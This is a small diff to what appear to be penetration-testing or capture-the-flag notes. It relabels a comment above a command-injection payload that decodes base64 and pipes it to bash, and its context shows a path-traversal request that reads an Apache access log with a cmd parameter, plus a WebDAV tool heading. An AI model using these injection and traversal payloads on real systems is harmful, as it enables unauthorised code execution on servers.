@@ -60,7 +60,7 @@ http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='co
 ---
 # Cadaver for WebDAV
 ---
-# payload in json format
+# payload in base64 format
 ```
 "\";echo <base64 payload> | base64 -d | bash;\""
 ```
